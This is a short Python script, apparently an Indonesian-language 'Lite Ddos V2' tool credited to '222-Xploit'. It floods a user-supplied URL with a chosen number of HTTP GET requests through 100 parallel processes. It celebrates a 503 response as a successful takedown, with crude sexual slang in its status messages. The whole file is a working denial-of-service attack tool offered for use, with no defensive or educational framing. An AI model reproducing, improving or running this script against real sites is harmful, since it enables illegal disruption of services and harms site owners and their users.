#Lite Ddos V2
#Credits By 222-Xploit

import requests
from multiprocessing import Pool
from colorama import Fore, Style, init

init(autoreset=True)

def open_link(url):
    try:
        response = requests.get(url)
        if response.status_code == 503:
            print(f"{Fore.GREEN}Website Berhasil Di entot: {response.status_code}")
        elif response.status_code == 403 or response.status_code == 429:
            print(f"{Fore.YELLOW}Website Gak mau di entot: {response.status_code}")
        else:
            print(f"{Fore.RED}𝗪𝗘𝗕𝗦𝗜𝗧𝗘 𝗦𝗘𝗗𝗔𝗡𝗚 𝗗𝗜 𝗘𝗡𝗧𝗢𝗧: {response.status_code}")
    except Exception as e:
        print(f"{Fore.RED}WEBSITE BERHASIL DI HAMILIN (Crot Crot²)")

if __name__ == "__main__":
    # Meminta pengguna untuk memasukkan URL
    link = input("Masukkan URL yang ingin di Ddos: ")
    count = int(input("Masukkan jumlah permintaan: "))

    with Pool(processes=100) as pool:  
        pool.map(open_link, [link] * count)